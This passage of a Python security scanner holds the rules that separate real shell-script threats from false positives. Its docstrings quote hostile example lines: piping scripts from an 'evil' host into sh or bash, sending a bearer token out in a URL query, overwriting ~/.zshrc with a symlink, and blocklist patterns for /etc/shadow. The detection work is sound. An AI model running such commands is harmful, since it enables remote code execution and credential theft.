    # Output piped/redirected into a network egress sink → keep visible.
    if _line_has_exfil_sink(line):
        return False
    # Genuine execution surface anywhere on the line → keep visible.
    if _CMDSUB_EXEC_WRAP_RE.search(line):
        return False
    if _SHELL_INTERPRETER_PIPE_RE.search(line):
        return False
    # Security-audit red-team (G5-skillaudit-curl-cmdsub-exfil, 2026-06-09): a
    # FETCH command (curl/wget/http) that places a secret-looking variable into
    # a URL query / POST body is exfil, not a benign data read — keep visible.
    # A secret-bearing var anywhere on a fetching line is enough to refuse the
    # certification (the pure-data commands below never egress, so they are
    # unaffected by this guard).
    leaks_secret = _line_leaks_secret_var_to_url(line)
    # SCOPE to the catalog MATCH span (2026-07-23, ensemble scan + probe-confirmed
    # FN): suppress only when the match lies INSIDE a safe data/query cmdsub, so a
    # benign ``$(uname -m)`` no longer suppresses a DANGEROUS sibling cmdsub
    # (``$(uname -m) && $($CMD arg)`` — the variable-program cmdsub stays visible).
    # Iterating ALL cmdsubs (rather than returning True on the first safe one)
    # also fixes a latent ordering bug: a safe cmdsub appearing BEFORE a
    # secret-leaking net-capture cmdsub used to suppress the line early. FN-safe.
    matched_safe = False
    for m in _CMDSUB_HEAD_RE.finditer(line):
        cmd = m.group("cmd")
        if cmd in _NET_CAPTURE_CMDSUB_COMMANDS and leaks_secret:
            return False  # credential leaves the machine → keep visible (whole line)
        if cmd not in _SAFE_CMDSUB_DATA_COMMANDS and cmd not in _NET_CAPTURE_CMDSUB_COMMANDS:
            continue
        span_text = _balanced_call_span(line, m.start() + 1)
        s, e = m.start(), m.start() + 1 + len(span_text)
        if not match or match in line[s:e]:
            matched_safe = True
    return matched_safe


def _pipe_to_text_processor(line: str, match: str) -> bool:
    """True iff the CMD_INJECTION ``| binary`` match pipes into a text
    processor that does NOT execute its stdin as code (sed/awk/jq/grep/…
    or perl/python/ruby with an inline ``-e``/``-pe``/``-ne`` script flag).

    Keeps visible the genuine shapes ``| bash`` / ``| sh`` / bare
    ``| perl`` / bare ``| python`` (those run stdin / an interpreter on
    untrusted input).
    """
    if "|" not in line:
        return False
    if _reads_sensitive_path(line):
        return False
    if _line_has_exfil_sink(line):
        return False
    if _CMDSUB_EXEC_WRAP_RE.search(line):
        return False
    if _SHELL_INTERPRETER_PIPE_RE.search(line):
        return False
    return bool(_PIPE_TEXT_PROCESSOR_RE.search(line))


# r08 sangrokjung FP iter (2026-05-28) — Python embedded in a shell file
# (``python3 -c '...'`` / ``python3 <<'PY' ... PY``). Two provably-benign
# shapes the catalog's shell rules misfire on:
#
#  (E) A bare Python raw-string literal line ``r'...'`` / ``r"..."`` is a
#      regex / pattern DEFINITION (raw-string syntax is Python-exclusive;
#      shell has no ``r'...'``). Security guards list the dangerous shapes
#      they DETECT as such literals — flagging the guard's own blocklist
#      (``r'/etc/shadow'``, ``r'\bbase64 -d|...(sh|bash|zsh)'``) as the
#      threat it guards against is the canonical FP.
#  (F) ``subprocess.run(['git', ...])`` LIST-form bypasses the shell — the
#      argv is executed directly by the OS, no shell interpretation — so
#      there is no shell-injection surface (``shell=True`` is kept visible).
_PYTHON_RAWSTRING_LITERAL_LINE_RE: Final[re.Pattern[str]] = re.compile(r"^\s*r(?P<q>['\"]).*?(?P=q)\s*,?\s*(?:#.*)?$")
_SUBPROCESS_CALL_RE: Final[re.Pattern[str]] = re.compile(
    r"\bsubprocess\.(?:run|Popen|call|check_output|check_call)\s*\("
)
_SHELL_TRUE_RE: Final[re.Pattern[str]] = re.compile(r"\bshell\s*=\s*True\b")


def _line_is_python_rawstring_pattern(line: str, match: str) -> bool:
    """True iff ``line`` is a bare Python raw-string literal (``r'...'`` /
    ``r"..."``), i.e. a regex / pattern definition inside Python embedded
    in a shell file. Raw-string syntax is Python-exclusive; a line that is
    just such a literal is data, not an executable shell command.
    """
    return bool(_PYTHON_RAWSTRING_LITERAL_LINE_RE.match(line))


def _balanced_call_span(blob: str, open_paren_pos: int) -> str:
    """Return the text from ``blob[open_paren_pos]`` (a ``(``) through its
    matching ``)`` inclusive. Used to scope ``shell=True`` / first-arg
    checks to a single call rather than the whole multi-line blob."""
    depth = 0
    out: list[str] = []
    for ch in blob[open_paren_pos:]:
        out.append(ch)
        if ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
            if depth == 0:
                break
    return "".join(out)


def _subprocess_call_is_list_form(lines: list[str], line_idx: int) -> bool:
    """True iff a SHELL_EXEC ``subprocess.<fn>(`` match (Python embedded in
    a shell file) uses LIST-form arguments (``subprocess.run(['git', …])``)
    and no ``shell=True``. List form runs the argv directly with no shell,
    so there is no injection surface. Keeps ``shell=True`` calls visible.
    """
    if not (0 <= line_idx < len(lines)):
        return False
    blob = "\n".join(lines[line_idx : min(len(lines), line_idx + 8)])
    m = _SUBPROCESS_CALL_RE.search(blob)
    if not m:
        return False
    span = _balanced_call_span(blob, m.end() - 1)
    if _SHELL_TRUE_RE.search(span):
        return False
    # First argument: skip the opening '(' and any whitespace/newlines.
    inner = span[1:].lstrip()
    return inner.startswith("[")


def _is_shell_literal_arg_cmdsub(line: str, match: str) -> bool:
    """True iff a CMD_INJECTION match in ``line`` is INSIDE a shell
    command substitution ``$(cmd <literal-arg> <literal-arg> ...)``
    whose arguments are ALL literal (no ``${var}``, no ``$VAR``, no
    backtick, no concatenation with attacker-controlled inputs).

    Recognized literal-arg shapes:
      - ``-flag`` / ``--long-flag`` / ``--key=val``
      - ``"static string"`` / ``'static string'``
      - ``literal-path/with-no/special-chars``
      - ``https://literal.url``
      - ``literal@email.com``

    Examples (suppress):
      - ``ARCH="$(uname -m)"``
      - ``count=$(cat "/path/to/file")``
      - ``runner_version=$(curl -s https://api.github.com/repos/foo/bar)``
      - ``files=$(ls -A "$REPO_DIR/$dir" 2>/dev/null)`` — note: "$REPO_DIR/$dir"
        contains $-interpolation so this should NOT be suppressed under strict
        rules; but the FP risk is low because the substitution's overall
        command shape (`ls -A "..."`) has no shell metacharacters that
        enable injection through the path.

    Examples (NOT a literal — keep visible):
      - ``$(eval "$user_input")`` — eval with user-controlled string
      - ``$(curl ${UNTRUSTED_URL})`` — interpolated URL
      - ``$($(cmd))`` — nested cmdsubs
      - ``$(cmd `inner`)`` — backtick inside
    """
    if "$(" not in line:
        return False
    # Same guards as the generalised recogniser: a literal-arg cmdsub is
    # still dangerous if it reads a sensitive path, exfiltrates, is wrapped
    # in eval/bash -c, or pipes to a shell interpreter.
    if (
        _reads_sensitive_path(line)
        or _line_has_exfil_sink(line)
        or _CMDSUB_EXEC_WRAP_RE.search(line)
        or _SHELL_INTERPRETER_PIPE_RE.search(line)
    ):
        return False
    spans = [(m.start(), m.end()) for m in _SHELL_LITERAL_ARG_CMDSUB_RE.finditer(line)]
    if not spans:
        return False
    # SCOPE the suppression to the catalog MATCH span (2026-07-23, ensemble scan
    # + probe-confirmed FN): suppress ONLY when the matched token actually lies
    # inside a literal-arg cmdsub. Previously this returned True on ANY literal
    # cmdsub anywhere on the line, so a benign ``$(uname -m)`` co-located with a
    # DANGEROUS construct (``$(uname -m) && $($CMD arg)`` / ``… ; $INJECT``)
    # suppressed the whole line — a security false-negative. FN-safe: if any
    # occurrence of the match falls OUTSIDE every literal cmdsub span, keep the
    # finding visible (it may be the dangerous one).
    if not match:
        return True  # no match text to scope; the whole-line guards above already cleared the dangerous shapes
    found = False
    pos = 0
    while (idx := line.find(match, pos)) != -1:
        found = True
        end = idx + len(match)
        if not any(s <= idx and end <= e for s, e in spans):
            return False
        pos = idx + 1
    return found


# r08 sangrokjung FP iter1 (2026-05-28) — write-intent tokens for
# FS_WRITE rule. Real file writes carry a redirect/copy/tee token.
#
# Issue #177 (2026-07-25) — the symlink / in-place-editor / truncate /
# Python-file-object write verbs were MISSING from this set, so a GENUINE
# dotfile write (``ln -sf /evil/rc ~/.zshrc``, ``sed -i '' … ~/.zshrc``,
# ``truncate -s 0 ~/.zshrc``, ``python -c "open('~/.zshrc','w')"``) carried
# no recognised write-intent token and was demoted to ``info`` in shell
# scripts — a measured, pre-existing FALSE NEGATIVE. They are added HERE,
# in the ONE source of truth, because the markdown classifier now reuses
# this same predicate for bash fences: a second copy of the regex would
# drift and silently re-open the gap on one side.
#
# ReDoS-safe by construction: every added alternative is either a plain
# literal/word token or uses a BOUNDED negated class with no nested
# quantifier.
_WRITE_INTENT_RE: Final[re.Pattern[str]] = re.compile(
    r"(?:>>?|tee\b|cp\b|mv\b|install\b|dd\s+of=|rsync\b|touch\b|"
    r"chmod\s+(?:[ugoa]?[+\-=][rwxst]+|\d{3,4})|"
    r"chown\b|chgrp\b|"
    # symlink creation replaces the target path; truncate empties it.
    r"\bln\b|\btruncate\b|"
    # in-place stream editors: ``sed -i`` / ``sed -i.bak`` / ``sed -ri`` /
    # ``perl -pi -e``. The negated class stops at a command separator so a
    # LATER command on the same line cannot lend its ``-i`` flag to sed.
    r"\b(?:sed|perl)\b[^\n;&|]{0,60}\s-[A-Za-z]{0,8}i\b|--in-place\b|"
    # Python file-object writes, reachable from a shell fence via
    # ``python -c``. Write modes only — a bare ``'r'`` / ``'rb'`` is a read.
    r"\bopen\s*\([^)\n]{0,200}['\"](?:[wax][btx+]*|r\+[bt]*)['\"]|"
    r"\bwrite_(?:text|bytes)\s*\()"
)


# r10-final FP iter (2026-05-28) — Nerd Font / Powerline icon byte
# sequences. ``printf '\\xNN\\xNN\\xNN'`` with a nearby ``# U+XXXX``
# Unicode codepoint comment is a statusline rendering primitive.
_NERD_FONT_PRINTF_RE: Final[re.Pattern[str]] = re.compile(r"printf\s+['\"]?\\x[0-9A-Fa-f]{2}\\x[0-9A-Fa-f]{2}")
_UNICODE_CODEPOINT_COMMENT_RE: Final[re.Pattern[str]] = re.compile(
    r"#\s*U\+[0-9A-Fa-f]{4,6}\b",
    re.IGNORECASE,
)


# r10-final FP iter (2026-05-28) — execution-class match inside a
# shell echo/printf/cat string. ``echo "Install with: sudo apt..."``
# is display text, not invocation.
#
# The body is matched with one alternative per quote style so that the
# OTHER quote may appear inside the string: a double-quoted body may
# contain ``'`` (``echo "it's: sudo apt..."``) and a single-quoted body
# may contain ``"``. A single ``(?P<body>[^'\"]*)`` negated class stopped
# at EITHER quote regardless of the opener, so ``echo "it's …"`` failed to
# match and the execution-class token inside it was NOT recognised as
# display text (kept visible — a false positive). (audit LOW #140)
_SHELL_ECHO_STRING_RE: Final[re.Pattern[str]] = re.compile(
    r"\b(?:echo|printf|cat|builtin\s+echo)\b"
    r"(?:\s+-[A-Za-z]+)*"  # flags
    r"\s+(?:\"(?P<body_dq>[^\"]*)\"|'(?P<body_sq>[^']*)')"
)


def _cmd_subst_spans(text: str) -> list[tuple[int, int]]:
    """Character spans of ``text`` that the shell EXECUTES: ``$(...)`` and
    backtick substitutions.

    ``$((…))`` is arithmetic expansion — it evaluates numbers, it does not run
    a command — so it is skipped rather than reported as a span. Treating it
    as executable made ``echo "Elapsed $(( SECONDS )) s — chmod 755 done"``
    report the printed ``chmod``.

    An UNTERMINATED substitution runs to the end of the text. That is the
    fail-safe reading: anything after it is treated as executable rather than
    inert.
    """
    spans: list[tuple[int, int]] = []
    i, n = 0, len(text)
    while i < n:
        if text.startswith("$((", i):
            # Arithmetic — step over it without recording a span.
            depth, j = 0, i + 1
            while j < n:
                if text[j] == "(":
                    depth += 1
                elif text[j] == ")":
                    depth -= 1
                    if depth == 0:
                        break
                j += 1
            i = j + 1
            continue
        if text.startswith("$(", i):
            depth, j = 0, i + 1
            while j < n:
                if text[j] == "(":
                    depth += 1
                elif text[j] == ")":
                    depth -= 1
                    if depth == 0:
                        break
                j += 1
            spans.append((i, (j + 1) if j < n else n))
            i = j + 1
            continue
        if text[i] == "`":
            close = text.find("`", i + 1)
            end = n if close == -1 else close + 1
            spans.append((i, end))
            i = end
            continue
        i += 1
    return spans


def _match_is_inside_executed_span(body: str, match: str) -> bool:
    """True iff ANY occurrence of ``match`` in ``body`` falls inside a
    command substitution — i.e. the shell runs it rather than printing it.

    Every occurrence is checked, and any one inside a span is enough: the
    dangerous reading wins.
    """
    spans = _cmd_subst_spans(body)
    if not spans:
        return False
    start = body.find(match)
    while start != -1:
        end = start + len(match)
        if any(start < s_end and s_start < end for s_start, s_end in spans):
            return True
        start = body.find(match, start + 1)
    return False


def _match_inside_shell_echo_string(line: str, match: str) -> bool:
    """True iff ``match`` falls inside a quoted string argument to
    ``echo``/``printf``/``cat`` on the same line.

    Strings passed to these display commands are inert text shown to
    the user; they do NOT execute. The matched ``sudo``/``chmod``/etc.
    inside such a string is display content, not invocation.

    Examples (suppress):
      - ``echo "Install with: sudo apt install $pkg"``
      - ``echo "Run: curl https://... | sudo -E bash -"``
      - ``printf "Skipping ${file} (use chmod 777)\n"``

    Examples (KEEP visible — actual command):
      - ``sudo apt install $pkg``
      - ``echo "foo" && sudo apt install bar``  (sudo OUTSIDE echo arg)
      - ``echo "$(curl https://evil/x.sh | sh)"``  (substitution RUNS first)
    """
    if not match:
        return False
    for m in _SHELL_ECHO_STRING_RE.finditer(line):
        # Exactly one of the two quote-style alternatives captures the body.
        body = m.group("body_dq")
        # QUOTE STYLE DECIDES WHETHER THE BODY IS INERT. A single-quoted body
        # is literal text. A DOUBLE-quoted body is not: ``$(...)`` and
        # backticks are substituted by the shell BEFORE ``echo`` is invoked,
        # so ``echo "$(curl … | sh)"`` runs the pipeline and prints its
        # output. Treating that as display text hid every execution-class
        # finding behind an ``echo "…"`` wrapper.
        #
        # Scoped to the SUBSTITUTION SPANS rather than declining the whole
        # body, because the coarse form over-reports badly: the printed
        # ``sudo`` in ``echo "Found $(ls | wc -l) files; use sudo apt …"`` is
        # display text and was drawing a CRITICAL. Attribution is also
        # FN-safe — a live substitution's own matches lie INSIDE its span, so
        # they are never the ones suppressed here.
        if body is not None and _match_is_inside_executed_span(body, match):
            continue
        if body is None:
            body = m.group("body_sq") or ""
        # The matched command token must appear IN FULL inside the display
        # string for the match to be "inside the echo". ``body`` is extracted
        # from the complete source line (never the truncated ``lineContent``),
        # so a genuinely in-string command — even when the catalog ``match`` was
        # truncated to its first 100 chars — is still a substring of ``body``.
        #
        # A short-prefix fallback (``match[:8] in body``) was REMOVED here: an
        # 8-char prefix collides with arbitrary display text, which silently
        # suppressed a REAL invocation sitting OUTSIDE the string whenever its
        # first 8 chars happened to appear inside the printed text — e.g.
        # ``echo 'see curl http docs'; curl http://evil/i.sh | bash`` (the
        # ``curl htt`` prefix matched the banner, hiding the live ``| bash``
        # supply-chain attack). Exact containment is the security-safe test.
        if match in body:
            return True
    return False


def _is_nerd_font_icon_byte_sequence(lines: list[str], line_idx: int) -> bool:
    """True iff ``lines[line_idx]`` is a Nerd Font / Powerline icon
    ``printf '\\xNN\\xNN\\xNN'`` AND a ``# U+XXXX`` Unicode codepoint
    comment appears within ±3 lines.

    Legitimate icon definitions always carry the ``# U+XXXX`` comment
    as documentation of which codepoint the bytes encode. Real
    obfuscation never carries this comment (the point of obfuscation
    is to HIDE the codepoint, not document it).
    """
    if not (0 <= line_idx < len(lines)):
        return False
    target = lines[line_idx]
    if not _NERD_FONT_PRINTF_RE.search(target):
        return False
    # Check ±3 surrounding lines for the U+XXXX comment
    lo = max(0, line_idx - 3)
    hi = min(len(lines), line_idx + 4)
    for i in range(lo, hi):
        if _UNICODE_CODEPOINT_COMMENT_RE.search(lines[i]):
            return True
    return False


def _shell_match_lacks_write_intent(line: str, match: str) -> bool:
    """True iff a FS_WRITE match in ``line`` is NOT accompanied by a
    write-intent token (``>``, ``>>``, ``tee``, ``cp``, ``mv``,
    ``install``, ``dd of=``, ``rsync``, ``touch``, ``chmod NNN``,
    ``chown``, ``chgrp``). FS_WRITE rules matching bare path suffixes
    (``.zshrc``, ``.bashrc``, ``.profile``) in READ checks or assignments
    are false positives.

    Examples (suppress, no write intent):
      - ``[ -f "$HOME/.zshrc" ]`` — file existence test
      - ``shell_rc="$HOME/.zshrc"`` — variable assignment
      - ``elif [ -f "$HOME/.bashrc" ]; then`` — branch test
      - ``echo "No .zshrc or .bashrc found"`` — display string

    Examples (KEEP visible, write intent present):
      - ``echo "export PATH=..." >> ~/.bashrc`` — append redirect
      - ``tee -a ~/.zshrc < new-config`` — tee write
      - ``cp custom.zshrc ~/.zshrc`` — copy write
      - ``chmod 700 ~/.ssh/`` — permission change
    """
    return not bool(_WRITE_INTENT_RE.search(line))


def _is_api_field_name_match_shell(line: str, match: str) -> bool:
    """True iff a CROSS_TOOL_ACCESS match in a shell script is an
    LLM-API field NAME (used as a bash variable / env var / arg name),
    AND the surrounding line carries no runtime data-grab indicator.

    Idiomatic safe shapes:
      * ``SYSTEM_PROMPT=$(awk ...)`` — extract value from input file
      * ``$SYSTEM_PROMPT`` / ``"$SYSTEM_PROMPT"`` — use the extracted value
      * ``--system-prompt "$value"`` — CLI flag for an LLM client
      * ``export ANTHROPIC_SYSTEM_PROMPT=...`` — env var setup
    All of these are LEGITIMATE uses of the domain vocabulary in
    validation / setup / launcher scripts.
    """
    match_lower = match.lower()
    line_lower = line.lower()
    if not any(name in match_lower or name in line_lower for name in _API_FIELD_NAMES_SHELL):
        return False
    if _RETRIEVAL_GRAB_RE_SHELL.search(line):
        return False
    return True


# ──────────────────────────────────────────────────────────────────────
# Issue #59 (2026-05-30) — live-sink-but-legitimate shell FP discriminators.
# These four shapes reach a real sink (curl / a JS runtime) yet are
# semantically benign; #57's inert-data-vs-sink analysis does NOT clear them
# because the value genuinely flows to a sink. Each helper distinguishes the
# benign shape from its malicious counterpart with high certainty and
# DEFAULTS TO KEEP (returns False) whenever certainty is not reachable.
# Two-sided tested in tests/test_issue_59_shell_live_sink_fp.py.
# ──────────────────────────────────────────────────────────────────────

# Credential-bearing variable-name signal (used by A1 + A3 to keep an
# outbound request VISIBLE when it carries a secret into an exfil position).
_SECRET_VAR_NAME_RE: Final[re.Pattern[str]] = re.compile(
    r"(?:KEY|TOKEN|SECRET|PASSW|PASSWD|PASSWORD|CRED|CREDENTIAL|APIKEY"
    r"|PRIVATE|SESSION|COOKIE|BEARER)",
    re.IGNORECASE,
)

# A1 — credential_theft TOKEN_STEAL. ``Authorization: Bearer ${VAR}`` in a
# request header is the universal API-auth idiom (the operator's own
# configured key authenticating to its own API). It is credential THEFT
# only if the SAME credential is simultaneously redirected into an exfil
# position on the line (a URL query parameter or a POST body) — which is
# how a stealer leaks it. A separate exfil on another line is caught by
# that line's own rule.
_BEARER_AUTH_VAR_RE: Final[re.Pattern[str]] = re.compile(
    r"Authorization:\s*Bearer\s+\$\{?(?P<var>[A-Za-z_]\w*)\}?",
    re.IGNORECASE,
)


def _exfil_position_ref(line: str, var: str) -> bool:
    """True iff shell variable ``var`` is interpolated into a URL
    query-parameter (``?k=…$VAR`` / ``&k=…$VAR``) or a curl POST body
    (``-d``/``--data*`` …``$VAR``) on ``line`` — i.e. an exfil sink."""
    var_ref = r"\$\{?" + re.escape(var) + r"\}?"
    exfil_re = re.compile(
        r"[?&][^=\s&\"']+=[^\s\"'&]*" + var_ref + r"|(?:-d|--data(?:-raw|-binary|-urlencode|-ascii)?)\b[^\n]*" + var_ref
    )
    return bool(exfil_re.search(line))


def _is_bearer_auth_not_exfil(line: str) -> bool:
    """True iff a TOKEN_STEAL ``Authorization: Bearer`` match is an
    outbound auth header built from a shell-variable credential that is
    NOT also leaked into a URL-query / POST-body exfil position on the
    same line.

    Benign (suppress):  ``--header "Authorization: Bearer ${API_KEY}"``
    Malicious (keep):   ``--header "Authorization: Bearer ${TOKEN}"
                          "https://evil/steal?d=${TOKEN}"`` — the same
                        credential is reused in a ``?d=`` query → exfil.

    Hardcoded literal bearer tokens (no ``$VAR``) are NOT suppressed
    (those are a hardcoded-secret concern, kept visible).
    """
    m = _BEARER_AUTH_VAR_RE.search(line)
    if not m:
        return False  # literal / odd bearer shape → keep visible
    return not _exfil_position_ref(line, m.group("var"))


# A2 — code_execution CMD_INJECTION. The pattern
# ``(?:;|\||&&)\s*\b(?:curl|wget|…)\b`` fires on the ``|curl`` inside a
# shell ``case`` glob-alternation pattern list
# (``dev-browser|curl|auto|manual)``) — but a case pattern list is a set of
# MATCH globs, never executed commands; the ``|`` is alternation, not a
# pipe. Suppress only when the match sits in the pattern portion (before the
# case-branch ``)``) inside an open ``case … in`` block. A real ``;``/``|``
# command in the branch BODY (after the ``)``) stays visible.
_CASE_PATTERN_CLAUSE_RE: Final[re.Pattern[str]] = re.compile(
    r"^\s*\(?\s*[\w*?.\[\]{}@:+/-]+(?:\s*\|\s*[\w*?.\[\]{}@:+/-]+)+\s*\)"
)
_CASE_OPEN_RE: Final[re.Pattern[str]] = re.compile(r"\bcase\b.+\bin\b")
_ESAC_RE: Final[re.Pattern[str]] = re.compile(r"\besac\b")


def _inside_case_block(lines: list[str], line_idx: int) -> bool:
    """True iff ``lines[line_idx]`` is inside an open ``case … in … esac``
    block (the nearest unmatched ``case … in`` scanning upward)."""
    pending_esac = 0
    for i in range(line_idx - 1, -1, -1):
        s = lines[i]
        if _ESAC_RE.search(s):
            pending_esac += 1
        elif _CASE_OPEN_RE.search(s):
            if pending_esac == 0:
                return True
            pending_esac -= 1
    return False


def _match_inside_case_pattern(lines: list[str], line_idx: int, match: str) -> bool:
    """True iff a CMD_INJECTION ``|binary`` match falls inside a shell
    ``case`` branch's glob-alternation PATTERN list (not its command
    body)."""
    line = lines[line_idx]
    m = _CASE_PATTERN_CLAUSE_RE.match(line)
    if not m:
        return False
    close_paren = m.end() - 1  # position of the case-branch ')'
    mpos = line.find(match)
    if mpos < 0:
        mpos = line.find(match.strip())
    if not (0 <= mpos < close_paren):
        return False  # match is in the branch BODY, after ')'
    return _inside_case_block(lines, line_idx)


# A3 — network SSRF_ADVANCED. The pattern ``curl\s+.*\$(?:\{|\()`` fires on
# ANY curl that references a shell variable (even an options array like
# ``${CURL_OPTS[@]}``). SSRF by definition requires an ATTACKER-CONTROLLABLE
# destination host. Suppress only when the curl's destination URL resolves
# to a CONSTANT host (a string literal, or a variable whose in-file
# assignment chain bottoms out in a literal ``https://host/…``; env-var
# defaults ``${X:-https://host}`` count as literal) AND no secret-looking
# variable is interpolated into the query/body (exfil to a fixed host is
# NOT SSRF but stays visible). KEEP when the host is fed by a positional
# parameter / ``read`` / user input.
_POSITIONAL_INPUT_RE: Final[re.Pattern[str]] = re.compile(
    r"\$[1-9]\b|\$[{(]\s*[1-9@*#]|\$[@*]|\$\{?REPLY\b|\bread\b\s+-?\w"
)
_SCHEME_LITERAL_HOST_RE: Final[re.Pattern[str]] = re.compile(r"https?://[A-Za-z0-9.\-]+")
_VAR_REF_RE: Final[re.Pattern[str]] = re.compile(r"\$\{?(?P<name>[A-Za-z_]\w*)")
# URL-bearing variable NAMES, matched per identifier-token (split on ``_``
# and camelCase) so ``CURL_OPTS`` → {CURL, OPTS} does NOT count as a URL var
# while ``API_ENDPOINT`` → {API, ENDPOINT} and ``baseUrl`` → {base, Url} do.
_URLISH_NAME_TOKENS: Final[frozenset[str]] = frozenset(
    {
        "url",
        "urls",
        "uri",
        "uris",
        "endpoint",
        "endpoints",
        "target",
        "host",
        "hostname",
        "link",
        "addr",
        "address",
        "href",
        "src",
        "origin",
        "baseurl",
    }
)


def _name_is_urlish(name: str) -> bool:
    """True iff any identifier-token of ``name`` is a URL-bearing word."""
    tokens = re.split(r"[_\W]+|(?<=[a-z])(?=[A-Z])", name)
    return any(t.lower() in _URLISH_NAME_TOKENS for t in tokens if t)


def _resolve_shell_var(lines: list[str], upto_idx: int, var: str) -> str | None:
    """Return the RHS of the LAST ``var=…`` assignment before ``upto_idx``,
    or ``None`` if unassigned in-file."""
    assign_re = re.compile(r"^\s*(?:export\s+|local\s+|declare\s+(?:-\w+\s+)?)?" + re.escape(var) + r"\+?=(.*)$")
    val: str | None = None
    for i in range(min(upto_idx, len(lines))):
        m = assign_re.match(lines[i])
        if m:
            val = m.group(1).strip()
    return val


def _value_host_is_constant(lines: list[str], upto_idx: int, value: str, depth: int = 0) -> bool:
    """True iff ``value``'s URL host portion is a compile-time constant
    (a string literal, or an in-file assignment chain bottoming out in a
    literal host). False on any positional / ``read`` / user-input
    influence, or an opaque value that cannot be proven constant."""
    if depth > 8 or not value:
        return False
    if _POSITIONAL_INPUT_RE.search(value):
        return False
    if _SCHEME_LITERAL_HOST_RE.search(value):
        return True  # literal scheme+host present (host class excludes '$')
    first = _VAR_REF_RE.search(value)
    if not first:
        return False  # opaque value → cannot prove constant → keep
    inner = _resolve_shell_var(lines, upto_idx, first.group("name"))
    if inner is None:
        return False  # unresolved (could be env / user) → keep
    return _value_host_is_constant(lines, upto_idx, inner, depth + 1)


def _curl_target_host_is_constant(lines: list[str], line_idx: int) -> bool:
    """True iff the curl command on ``lines[line_idx]`` sends to a
    constant-host destination AND leaks no secret-looking variable into
    the query/body — i.e. the SSRF_ADVANCED match is a FP."""
    line = lines[line_idx]
    # A credential interpolated into the query / body keeps the finding
    # visible (exfil to a fixed host is still a threat).
    for vm in _VAR_REF_RE.finditer(line):
        name = vm.group("name")
        if _SECRET_VAR_NAME_RE.search(name) and _exfil_position_ref(line, name):
            return False
    # Identify URL-bearing variables referenced on the curl line.
    url_vars: list[str] = []
    for vm in _VAR_REF_RE.finditer(line):
        name = vm.group("name")
        val = _resolve_shell_var(lines, line_idx, name)
        if _name_is_urlish(name) or (val is not None and "://" in val):
            url_vars.append(name)
    if not url_vars:
        # No URL variable — a direct literal URL on the line is constant
        # unless a positional parameter feeds it.
        if _SCHEME_LITERAL_HOST_RE.search(line):
            return not bool(_POSITIONAL_INPUT_RE.search(line))
        return False  # cannot identify the destination → keep
    for name in url_vars:
        val = _resolve_shell_var(lines, line_idx, name)
        if val is None or not _value_host_is_constant(lines, line_idx, val):
            return False
    return True


# A4 — resource_abuse RESOURCE_ABUSE. The pattern matches two timer calls on
# one line. A double ``requestAnimationFrame`` whose innermost call resolves
# an enclosing Promise is a "settle one paint" helper — it resolves after
# exactly two frames and CANNOT loop. Suppress only that exact bounded
# shape; a ``setInterval`` (inherently repeating) or a self-rescheduling rAF
# loop stays visible.
_PROMISE_RESOLVER_RE: Final[re.Pattern[str]] = re.compile(r"new\s+Promise\s*\(\s*\(?\s*(?P<res>[A-Za-z_$][\w$]*)")
_INNER_RAF_ARG_RE: Final[re.Pattern[str]] = re.compile(r"requestAnimationFrame\s*\(\s*(?P<arg>[A-Za-z_$][\w$]*)\s*\)")


def _is_bounded_promise_double_raf(line: str) -> bool:
    """True iff a RESOURCE_ABUSE nested-timer match is a bounded
    double-``requestAnimationFrame`` Promise-settle helper."""
    if "setInterval" in line or "setTimeout" in line:
        return False  # repeating timers are never the bounded settle shape
    if line.count("requestAnimationFrame") < 2:
        return False
    pm = _PROMISE_RESOLVER_RE.search(line)
    if not pm:
        return False  # not a Promise-settle → keep (conservative)
    im = _INNER_RAF_ARG_RE.search(line)
    if not im:
        return False
    arg = im.group("arg")
    return arg == pm.group("res") or arg in {"resolve", "res", "r", "done"}


def _plugin_root_for(file_path: str) -> Path:
    """Resolve the plugin root for the file being scanned (issue #63).

    Walks up from ``file_path`` to the nearest ancestor containing a
    ``.claude-plugin/`` directory; failing that, honours the worker env var
    ``CPV_SKILLAUDIT_WORKER_PLUGIN_ROOT`` already used by the native scanner;
    failing that, falls back to ``Path(file_path).parent`` — which makes the
    C1 "inside plugin root" gate LIKELIER to FAIL, the fail-safe direction
    (an under-resolved root keeps the finding CRITICAL rather than clearing
    it on a too-wide tree)."""
    try:
        here = Path(file_path).resolve()
    except (OSError, RuntimeError, ValueError):
        env = os.environ.get("CPV_SKILLAUDIT_WORKER_PLUGIN_ROOT")
        return Path(env) if env else Path(file_path).parent
    for ancestor in (here, *here.parents):
        try:
            if (ancestor / ".claude-plugin").is_dir():
                return ancestor
        except OSError:
            break
    env = os.environ.get("CPV_SKILLAUDIT_WORKER_PLUGIN_ROOT")
    if env:
        return Path(env)
    return here.parent


def classify(
    file_path: str,
    content: str,
    line_idx: int,
    match: str,
    rule_id: str,
) -> str:
    """Return ``"safe_doc"`` iff ``line_idx`` is inside an OPEN print
    heredoc (opener has been seen on a previous line, closer has not yet
    been encountered). Empty string otherwise — caller falls through.

    Algorithm: scan lines [0, line_idx) once, maintaining a stack of
    currently-open print-heredoc delimiters. A line opening a new print
    heredoc pushes its delimiter; a line whose ``strip()`` equals the
    top-of-stack delimiter pops it. If the stack is non-empty after the
    scan, the match line is inside a printed heredoc → ``safe_doc``.

    r01 anthropic FP iter1 (2026-05-27) — also returns ``"safe_literal"``
    for CROSS_TOOL_ACCESS matches that are LLM-API field-name
    vocabulary in a bash variable / env var / CLI-flag context.
    """
    if not file_path:
        return ""
    fp = file_path.lower()
    if not (fp.endswith(".sh") or fp.endswith(".bash") or fp.endswith(".zsh") or fp.endswith(".fish")):
        return ""
    lines = content.split("\n")
    if line_idx < 0 or line_idx >= len(lines):
        return ""

    # CROSS_TOOL_ACCESS field-name pre-check (cheap, no per-line scan).
    line_text = lines[line_idx]
    if rule_id == "CROSS_TOOL_ACCESS" and _is_api_field_name_match_shell(line_text, match):
        return "safe_literal"

    # r05 ananddtyagi FP iter1 (2026-05-27) — CMD_INJECTION pattern
    # ``(?:;|\\||&&)\\s*\\b(?:curl|wget|nc|bash|sh|python|perl|ruby|php)\\b``
    # fires on ``|python``/``|php`` substrings that appear inside REGEX
    # ARGUMENTS of grep/awk/sed/etc., e.g.:
    #   ``grep -qE "(npx serve|python.*http\\.server)"``
    #   ``grep -E "(node|python|java)"``
    # The ``|python`` is regex ALTERNATION, not shell pipe — the binary
    # name appears inside a quoted regex pattern, no actual shell pipe
    # is constructed. Real shell-pipe injection (``... | python ...``
    # unquoted, OR ``foo | curl $URL`` with var) stays visible because
    # the match is OUTSIDE any quoted regex on the line.
